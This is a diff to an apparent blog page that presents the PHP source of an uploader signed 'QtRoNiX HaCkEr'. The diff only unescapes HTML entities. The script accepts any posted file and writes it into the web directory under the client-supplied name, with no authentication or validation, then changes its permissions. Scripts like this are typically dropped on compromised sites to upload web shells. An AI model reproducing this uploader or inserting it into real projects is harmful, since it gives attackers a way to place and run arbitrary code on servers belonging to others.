@@ -17,7 +17,7 @@ A simple uploader script by QtRoNiX HaCkEr.
 ### Script Upload By QtRoNiX HaCkEr Source Code
 
 {% highlight php linenos %}<?php
-echo '&lt;center&gt;&lt;font color="Red" size="4"&gt;';
+echo '<center><font color="Red" size="4">';
 /// Script Upload By QtRoNiX HaCkEr \\\
 if(isset($_POST['Submit'])){
 	$filedir = ""; 
@@ -29,12 +29,12 @@ if(isset($_POST['Submit'])){
 		$qx = $filedir.$userfile_name;
 		@move_uploaded_file($userfile_tmp, $qx);
 		@chmod ($qx, octdec($mode));
-echo"&lt;center&gt;&lt;b&gt;Done ==&gt; $userfile_name&lt;/b&gt;&lt;/center&gt;";
+echo"<center><b>Done ==> $userfile_name</b></center>";
 }
 }
 else{
-echo'&lt;form method="POST" action="#" enctype="multipart/form-data"&gt;&lt;input type="file" name="image"&gt;&lt;br&gt;&lt;input type="Submit" name="Submit" value="Upload"&gt;&lt;/form&gt;';
+echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
 }
-echo '&lt;/center&gt;&lt;/font&gt;';
+echo '</center></font>';
 ?>
 {% endhighlight %}
